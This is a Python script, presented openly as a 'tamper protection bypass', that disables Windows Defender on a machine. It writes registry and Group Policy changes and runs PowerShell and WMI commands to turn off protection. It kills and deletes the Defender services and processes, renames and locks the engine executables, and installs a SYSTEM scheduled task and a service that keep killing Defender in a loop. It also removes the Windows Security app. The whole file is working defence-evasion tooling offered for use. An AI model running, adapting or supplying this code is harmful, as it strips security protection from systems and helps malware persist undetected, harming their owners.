#!/usr/bin/env python3
"""
IMMEDIATE WINDOWS DEFENDER KILL - TAMPER PROTECTION BYPASS
Direct process and service destruction
"""

import subprocess
import os
import sys
import time
import ctypes
import psutil

CREATE_NO_WINDOW = 0x08000000

def kill_defender_now():
    """Direct immediate Defender termination"""
    print("[!] IMMEDIATE DEFENDER TERMINATION")
    
    # STEP 1: Disable Tamper Protection FIRST (critical)
    print("[1] Disabling Tamper Protection via registry")
    
    tamper_cmds = [
        # Force disable tamper protection
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TPForConsumer" /t REG_DWORD /d 0 /f',
        
        # Disable via PowerShell with force
        'powershell -Command "Set-MpPreference -DisableTamperProtection $true -Force"',
        
        # WMI method
        '''
        powershell -Command "
        $config = Get-WmiObject -Namespace 'root\\Microsoft\\Windows\\Defender' -Class 'MSFT_MpPreference' -ErrorAction SilentlyContinue
        if ($config) {
            $config.DisableTamperProtection = $true
            $config.Put()
        }
        "'''
    ]
    
    for cmd in tamper_cmds:
        try:
            subprocess.run(cmd if '\n' not in cmd else ['powershell', '-Command', cmd.strip()],
                          shell=True if '\n' not in cmd else False,
                          capture_output=True,
                          creationflags=CREATE_NO_WINDOW,
                          timeout=5)
        except:
            pass
    
    time.sleep(2)
    
    # STEP 2: Stop ALL Defender services aggressively
    print("[2] Stopping Defender services")
    
    services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdFilter", "WdBoot"]
    
    for service in services:
        try:
            # Multiple stop methods
            subprocess.run(f'sc stop {service}', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            subprocess.run(f'net stop {service} /y', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            subprocess.run(f'powershell -Command "Stop-Service {service} -Force"', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        except:
            pass
    
    time.sleep(1)
    
    # STEP 3: DIRECT PROCESS KILL - No protection
    print("[3] Direct process kill - brute force")
    
    # Get all processes and kill ANY Defender related ones
    defender_processes = []
    
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name'].lower()
            if any(keyword in name for keyword in ['defender', 'msmp', 'securityhealth', 'sense', 'nis']):
                defender_processes.append(proc.info['pid'])
        except:
            pass
    
    print(f"[*] Found {len(defender_processes)} Defender processes")
    
    # Kill using multiple methods for each process
    for pid in defender_processes:
        try:
            # Method 1: taskkill
            subprocess.run(f'taskkill /F /PID {pid} /T', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Method 2: PowerShell
            subprocess.run(f'powershell -Command "Stop-Process -Id {pid} -Force"', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Method 3: WMI
            subprocess.run(f'powershell -Command "(Get-WmiObject Win32_Process -Filter \'ProcessId={pid}\').Terminate()"', 
                          shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Method 4: Direct Python kill
            try:
                p = psutil.Process(pid)
                p.terminate()
                time.sleep(0.5)
                if p.is_running():
                    p.kill()
            except:
                pass
                
        except:
            pass
    
    # STEP 4: Disable service startup permanently
    print("[4] Permanently disabling services")
    
    for service in services:
        try:
            # Disable service
            subprocess.run(f'sc config {service} start= disabled', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Set failure action to take no action
            subprocess.run(f'sc failure {service} reset= 0 actions= ""', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Delete service if possible
            subprocess.run(f'sc delete {service}', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        except:
            pass
    
    # STEP 5: Block Defender executables
    print("[5] Blocking Defender executables")
    
    defender_exes = [
        "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
        "C:\\Program Files\\Windows Defender\\NisSrv.exe",
        "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
        "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MsMpEng.exe",
    ]
    
    for exe_path in defender_exes:
        try:
            # Rename executables
            if os.path.exists(exe_path):
                new_name = exe_path + ".disabled"
                os.rename(exe_path, new_name)
                
                # Set deny permissions
                subprocess.run(f'icacls "{exe_path}" /deny Everyone:F', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
                subprocess.run(f'icacls "{new_name}" /deny Everyone:F', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        except:
            pass
    
    # STEP 6: Disable via Group Policy
    print("[6] Applying Group Policy disable")
    
    gp_cmds = [
        # Disable via Group Policy
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
        
        # Disable cloud protection
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f',
        
        # Force update group policy
        'gpupdate /force'
    ]
    
    for cmd in gp_cmds:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
        except:
            pass
    
    time.sleep(2)
    
    # STEP 7: Final verification and cleanup
    print("[7] Final verification")
    
    # Check if Defender processes are still running
    remaining = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name'].lower()
            if any(keyword in name for keyword in ['defender', 'msmp', 'securityhealth']):
                remaining.append(proc.info['pid'])
        except:
            pass
    
    # If processes remain, use nuclear option
    if remaining:
        print(f"[!] {len(remaining)} processes still running - using nuclear option")
        
        # Use Windows Management Instrumentation to force stop
        wmi_kill = '''
        $processes = Get-WmiObject Win32_Process | Where-Object {
            $_.Name -match "MsMp|Defender|SecurityHealth|Sense|Nis"
        }
        foreach ($proc in $processes) {
            try {
                $proc.Terminate()
                Start-Sleep -Milliseconds 100
            } catch {}
        }
        
        # Disable via security policy
        secedit /configure /db secedit.sdb /cfg C:\\Windows\\inf\\defltbase.inf /areas SECURITYPOLICY /quiet
        
        # Force stop via COM
        $defender = New-Object -ComObject Microsoft.WindowsDefender.AppManagement
        try { $defender.Disable() } catch {}
        '''
        
        subprocess.run(['powershell', '-Command', wmi_kill],
                      capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15)
    
    return len(remaining) == 0

def create_defender_blocker():
    """Create permanent Defender blocker service"""
    print("[!] Creating permanent Defender blocker")
    
    blocker_script = '''
    @echo off
    :loop
    taskkill /F /IM MsMpEng.exe 2>nul
    taskkill /F /IM NisSrv.exe 2>nul
    taskkill /F /IM SecurityHealthService.exe 2>nul
    sc stop WinDefend 2>nul
    sc stop WdNisSvc 2>nul
    timeout /t 10 /nobreak >nul
    goto loop
    '''
    
    # Save blocker script
    blocker_path = os.path.join(os.environ['TEMP'], 'defender_blocker.bat')
    with open(blocker_path, 'w') as f:
        f.write(blocker_script)
    
    # Create scheduled task to run blocker
    task_cmd = f'''
    schtasks /create /tn "WindowsDefenderBlocker" /tr "{blocker_path}" /sc minute /mo 1 /ru SYSTEM /f
    schtasks /run /tn "WindowsDefenderBlocker"
    '''
    
    subprocess.run(task_cmd, shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
    
    # Also create service
    service_cmd = f'''
    sc create DefenderBlocker binPath= "cmd /c start /min {blocker_path}" type= own start= auto
    sc start DefenderBlocker
    '''
    
    subprocess.run(service_cmd, shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)

def main():
    """Main execution"""
    print("\n" + "="*60)
    print("  WINDOWS DEFENDER IMMEDIATE KILL - TAMPER BYPASS")
    print("="*60)
    
    # Check admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[!] Run as Administrator!")
        return
    
    print("[*] Starting aggressive Defender termination...")
    
    success = kill_defender_now()
    
    if success:
        print("\n[✓] WINDOWS DEFENDER TERMINATED SUCCESSFULLY")
        print("[✓] All processes and services stopped")
        print("[✓] Tamper protection bypassed")
        
        # Create permanent blocker
        create_defender_blocker()
        print("[✓] Permanent blocker service installed")
        
        # Disable Windows Security app
        print("[*] Disabling Windows Security app...")
        subprocess.run('powershell -Command "Get-AppxPackage Microsoft.Windows.SecHealthUI | Remove-AppxPackage"',
                      shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        
    else:
        print("\n[!] Defender partially terminated")
        print("[!] Some components may still be active")
        print("[*] Installing permanent blocker as fallback...")
        create_defender_blocker()
    
    print("\n" + "="*60)
    print("[*] COMPLETE - Windows Defender should now be disabled")
    print("[*] Firewall is already off")
    print("[*] System is now unprotected")
    print("="*60)
    
    # Quick verification
    print("\n[*] Quick verification:")
    subprocess.run('tasklist | findstr /i "defender msmp"', shell=True)
    subprocess.run('sc query WinDefend', shell=True)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Error: {e}")
